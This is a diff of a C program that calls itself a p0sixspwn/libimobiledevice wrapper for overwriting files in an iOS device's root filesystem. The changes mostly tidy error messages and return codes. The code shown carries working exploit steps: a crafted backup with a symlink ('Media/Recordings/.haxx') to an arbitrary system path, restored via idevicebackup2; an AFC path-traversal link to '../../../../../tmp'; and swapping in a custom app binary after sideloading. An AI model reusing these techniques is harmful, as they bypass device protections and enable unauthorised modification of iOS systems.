@@ -87,24 +87,24 @@ int main(int argc, char** argv) {
     if (!uuid){
         device = device_create(NULL);
         if (!device){
-            printf("We got problems holmes\n");
-            return -69;
+            printf("We got problems\n");
+            return -1;
         }
         uuid = strdup(device->uuid);
     } else {
         device = device_create(uuid);
         if (!device){
-            printf("We got problems holmes\n");
-            return -69;
+            printf("We got problems\n");
+            return -1;
         }
     }
     idevice_event_subscribe(idevice_event_cb, uuid);
-    printf("ayy we got  %s here\n",uuid);
+    printf("%s is here\n",uuid);
     lockdown_t *lockdown = lockdown_open(device);
     if (lockdown == NULL){
-        printf("We got lockdown problems holmes\n");
+        printf("We got lockdown problems\n");
         device_free(device);
-        return -69;
+        return -1;
     }
     printf("Starting haarp\n");
     lockdown_get_string(lockdown, "HardwareModel", &product);
@@ -117,13 +117,13 @@ int main(int argc, char** argv) {
         printf("p0sixspwn/libimobiledevice wrapper to overwrite stuff in the iOS rootfs:\nlocalfilepath: file to write to iDevice;\nremotepath: directory to write the file in (e.g. /var/db);\nremotefilename: name of the file to overwrite\n");
         if (argc<4) {
             printf("Usage: ./1337estcode localfilepath remotepath remotefilename\n");
-            return -69;
+            return -1;
         }
         char backup_dir[1337];
         int port=0;
         if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0){
             printf("We got holmes problems\n");
-            return -69;
+            return -1;
         }
     
         if (lockdown_close(lockdown) !=0){
@@ -134,12 +134,12 @@ int main(int argc, char** argv) {
         desc.port = port;
         afc_client_new(device->client, &desc, &afc);
         if (afc==NULL){
-            printf("yaint got no afc\n");
-            return -69;
+            printf("you've got no afc\n");
+            return -1;
         }
         uint64_t handle=0;
         uint32_t written=0;
-        if (afc_send_file(afc, "senpai.txt", "/senpai.txt") != AFC_E_SUCCESS ){ // /var/mobile/Media*
+        if (afc_send_file(afc, "inject.txt", "/inject.txt") != AFC_E_SUCCESS ){ // /var/mobile/Media*
             printf("try again\n");
         }
         tmpnam(backup_dir);
@@ -155,21 +155,21 @@ int main(int argc, char** argv) {
         backup = backup_open(backup_dir, uuid);
         if (!backup) {
             fprintf(stderr, "We aint got no backup \n");
-            return -69;
+            return -1;
         }
         if (backup_mkdir(backup, "MediaDomain", "Media/Recordings", 0755, 501, 501, 4) != 0) {
             printf("Could not make folder\n");
-            return -69;
+            return -1;
         }
         if (backup_symlink(backup, "MediaDomain", "Media/Recordings/.haxx", argv[2], 501, 501, 4) != 0) {
             printf("Could not symlink dem shits!\n");
-            return -69;
+            return -1;
         }
         char dest[64] = "Media/Recordings/.haxx/";
         strcat(dest, argv[3]);
         if (backup_add_file_from_path(backup, "MediaDomain", argv[1], dest, 0100755, 0, 0, 4) != 0) {
             printf("Could not add memes\n");
-            return -69;
+            return -1;
         }
     
         snprintf(backup1, sizeof(backup1), "idevicebackup2 restore --system --settings --reboot %s", backup_dir);
@@ -182,8 +182,8 @@ int main(int argc, char** argv) {
     } else if (opt==2) {
         int port=0;
         if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0){
-            printf("We got holmes problems\n");
-            return -69;
+            printf("We got problems\n");
+            return -1;
         }
         if (lockdown_close(lockdown) !=0){
             printf("uh?");
@@ -194,30 +194,27 @@ int main(int argc, char** argv) {
         afc_client_new(device->client, &desc, &afc);
         if (afc==NULL){
             printf("yaint got no afc\n");
-            return -69;
+            return -1;
         }
         if(afc_make_link(afc, 2, "../../../../../tmp", "Downloads/a/a/a/a/a/link") != AFC_E_SUCCESS){
-            fprintf(stderr, "Could not drink juice\n");
-            return -69;
+            return -1;
         }
         if(afc_rename_path(afc, "Downloads/a/a/a/a/a/link", "tmp") != AFC_E_SUCCESS) {
-            fprintf(stderr, "Could not drink juice2\n");
-            return -69;
+            return -1;
         }
-        if(afc_send_file(afc, "senpai.txt", "tmp/kek") != AFC_E_SUCCESS) {
-            fprintf(stderr, "Could not drink juice3\n");
-            return -69;
+        if(afc_send_file(afc, "inject.txt", "tmp/kek") != AFC_E_SUCCESS) {
+            return -1;
         }
         uint32_t *read;
         uint64_t handle=0;
       /*  if (afc_file_open(afc, "tmp/kek",AFC_FOPEN_RDONLY, &handle) != AFC_E_SUCCESS) {    read 10 bytes from tmp dir
             printf("fuk of\n");
-            return -69;
+            return -1;
         }
         char *baits = (char *) malloc(sizeof(char)*10);
         if (afc_file_read(afc, handle, baits,10,&read) != AFC_E_SUCCESS){
             fprintf(stderr, "Could not drink juice4\n");
-            return -69;
+            return -1;
         }
         if (read > 0)
             printf("Result: %s\n", baits);
@@ -228,8 +225,8 @@ int main(int argc, char** argv) {
     } else if (opt == 3){
         int port=0;
         if (lockdown_start_service(lockdown, "com.apple.afc", &port) != 0){
-            printf("We got holmes problems\n");
-            return -69;
+            printf("We got problems\n");
+            return -1;
         }
         if (lockdown_close(lockdown) !=0){
             printf("uh?");
@@ -239,19 +236,17 @@ int main(int argc, char** argv) {
         desc.port = port;
         afc_client_new(device->client, &desc, &afc);
         if (afc==NULL){
-            printf("yaint got no afc\n");
-            return -69;
+            printf("you have got no afc\n");
+            return -1;
         }
         if (afc_send_directory(afc, "coolipa/x/Payload/WWDC.app","Downloads/WWDC.app") != AFC_E_SUCCESS) {
-            fprintf(stderr, "Boneless error\n");
-            return -69;
+            return -1;
         }
         char cmd[1024];
         snprintf(cmd, sizeof(cmd), "ideviceinstaller -u %s -i coolipa/pkg.ipa", uuid);
         system(cmd);
         if(afc_send_file(afc, "WWDC", "Downloads/WWDC.app/WWDC") != AFC_E_SUCCESS) { // custom WWDC shabang
-            fprintf(stderr, "Boneless error 2\n");
-            return -69;
+            return -1;
         }
         fprintf(stdout, "Job completed!\n");
     } else {
@@ -261,6 +256,5 @@ int main(int argc, char** argv) {
     afc_client_free(afc);
     afc = NULL;
     device_free(device);
-    printf("Goodbai\n");
     return 0;
 }
